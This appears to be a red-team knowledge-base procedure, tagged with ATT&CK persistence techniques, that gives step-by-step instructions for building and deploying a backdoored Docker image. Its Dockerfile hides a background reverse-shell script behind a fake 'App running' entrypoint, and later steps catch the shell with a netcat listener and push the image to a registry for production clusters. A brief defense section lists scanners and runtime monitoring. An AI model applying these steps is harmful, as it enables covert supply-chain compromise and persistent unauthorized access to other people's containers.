---
id: 12904dd3-bc3b-4075-a4ba-d9694f6d7dcf
name: Create-Backdoored-Docker-Image
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:13.142615+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Persistence|TA0003 - Persistence]]'
techniques:
  - >-
    [[techniques/Boot-or-Logon-Autostart-Execution|T1547 - Boot or Logon
    Autostart Execution]]
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059 - Command and Scripting
    Interpreter]]
sub_techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter:Unix-Shell|T1059.004 -
    Command and Scripting Interpreter: Unix Shell]]
tags:
  - '[[tags/Building-images-with-backdoor]]'
  - '[[tags/Cloud-AWS]]'
  - '[[tags/Persistence]]'
  - docker
  - container
  - backdoor
commands:
  - '[[commands/docker-build-tagged-image]]'
platforms:
  - Linux
  - Docker
  - Cloud
tools:
  - '[[tools/Docker]]'
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# Create-Backdoored-Docker-Image

## Summary

This procedure outlines how to create a Docker image embedded with a backdoor for establishing persistence in a containerized environment. By modifying a Dockerfile to include malicious code, such as a reverse shell that activates on container startup, attackers can maintain access to cloud or Kubernetes deployments even after initial compromises are remediated.

## Description

In containerized environments like AWS ECS or Kubernetes, attackers often inject backdoors into custom Docker images to achieve persistence. This involves crafting a Dockerfile that bases on a legitimate image (e.g., Ubuntu) and appends instructions to install and execute a payload, such as a reverse shell script that connects back to the attacker's command and control server upon container initialization. The image can then be pushed to a registry and deployed, ensuring the backdoor runs in every instance of the container. This technique is particularly effective in CI/CD pipelines where images are built automatically, bypassing manual reviews. Prerequisites include access to a build environment with Docker installed and knowledge of basic shell scripting. Successful execution results in a functional image that deploys the backdoor without altering the container's primary functionality.

## Requirements

1. Docker installed on a build machine with sufficient privileges to execute builds and push to a registry.
2. Access to a target registry (e.g., Docker Hub, AWS ECR) for storing and deploying the image.
3. Network connectivity from the build environment to the attacker's C2 server for testing the backdoor.
4. Basic knowledge of Dockerfile syntax and shell scripting.
5. A legitimate base image to avoid suspicion (e.g., official Ubuntu or Nginx images).

## Defense

- Implement mandatory code reviews and static analysis for all Dockerfiles using tools like Hadolint or Trivy to detect suspicious instructions (e.g., curl downloads, base64 decoders).
- Enforce Docker Content Trust (DCT) to sign and verify images before deployment, preventing unsigned malicious images from running.
- Scan images with vulnerability scanners like Clair or Anchore during CI/CD pipelines to identify embedded malware or anomalous layers.
- Monitor container runtime for unexpected network connections or process executions using tools like Falco or AWS GuardDuty.
- Use multi-stage builds and minimal base images to reduce attack surface, and restrict container privileges with seccomp profiles and non-root users.

## Objectives

1. Construct a Dockerfile that incorporates a backdoor payload without disrupting the image's intended application.
2. Build and tag the image for deployment in the target environment.
3. Verify the backdoor functionality by running the container and confirming C2 connectivity.
4. Push the image to a registry for persistent deployment in production clusters.

## Instructions

### Step 1: Prepare the Build Directory and Backdoor Payload

**Context**: Create a working directory and embed the backdoor code using a reusable script snippet. This ensures the payload is ready to integrate into the Dockerfile. The backdoor here is a simple bash reverse shell that activates on startup.

Copy the backdoor code from [[codes/Bash-Reverse-Shell-for-Docker-Backdoor]] into a file named `backdoor.sh` in your build directory.

```bash
mkdir backdoor-image
cd backdoor-image
echo '# Contents of backdoor.sh' > backdoor.sh
# Paste the exact code from the linked code snippet here, substituting placeholders
```

> This step sets up the isolated environment. Expected output: Directory created with `backdoor.sh` file present. Verify with `ls -la` showing the file.

### Step 2: Create the Malicious Dockerfile

**Context**: Write a Dockerfile that installs dependencies, copies the backdoor script, makes it executable, and triggers it during container startup (e.g., via ENTRYPOINT or a startup script). Base it on a common image like Ubuntu to blend in.

Create a file named `Dockerfile` with the following content:

```dockerfile
FROM ubuntu:20.04

# Install curl for potential C2 communication
RUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*

# Copy and prepare backdoor
COPY backdoor.sh /usr/local/bin/backdoor.sh
RUN chmod +x /usr/local/bin/backdoor.sh

# Simulate a legitimate app (e.g., echo server)
ENTRYPOINT ["sh", "-c", "/usr/local/bin/backdoor.sh & echo 'App running' && tail -f /dev/null"]
```

> This Dockerfile ensures the backdoor runs in the background while the container appears normal. Expected output: No errors when validating syntax with `docker build --no-cache --progress=plain - < Dockerfile` (dry run). Success if the file is created without syntax issues.

### Step 3: Build the Backdoored Image

**Context**: Use Docker to compile the image from the Dockerfile, tagging it for easy identification and registry push. This step encapsulates the backdoor into a deployable artifact.

**Command** ([[commands/docker-build-tagged-image]]):

```bash
docker build -t $_IMAGE_NAME:$_TAG .
```

> Replace `$_IMAGE_NAME` with a benign name like `myapp` and `$_TAG` with `v1.0`. This builds the image locally. Expected output: Build logs showing layers being created, ending with "Successfully tagged myapp:v1.0". Verify with `docker images` listing the new image.

### Step 4: Test the Backdoor Functionality

**Context**: Run the container locally to confirm the backdoor establishes a connection to your C2 listener without crashing the container.

Start a netcat listener on your attacker machine: `nc -lvnp $_C2_PORT` (e.g., 4444). Then run the container:

```bash
docker run -d --name test-backdoor $_IMAGE_NAME:$_TAG
```

> Expected output: Netcat receives a shell connection from the container. Check container logs with `docker logs test-backdoor` showing both backdoor execution and the app echo. Success if you can execute commands like `whoami` over the reverse shell. Clean up with `docker stop test-backdoor && docker rm test-backdoor`.

### Step 5: Push to Registry for Deployment

**Context**: Upload the image to a container registry for deployment in the target environment, ensuring persistence once pulled and run.

Login to the registry if needed: `docker login $_REGISTRY`. Then push:

```bash
docker push $_IMAGE_NAME:$_TAG
```

> Expected output: Push progress logs ending with "latest: digest: sha256:...". Verify in the registry UI or CLI that the image is available. This completes the procedure, ready for orchestration tools like Kubernetes to deploy.
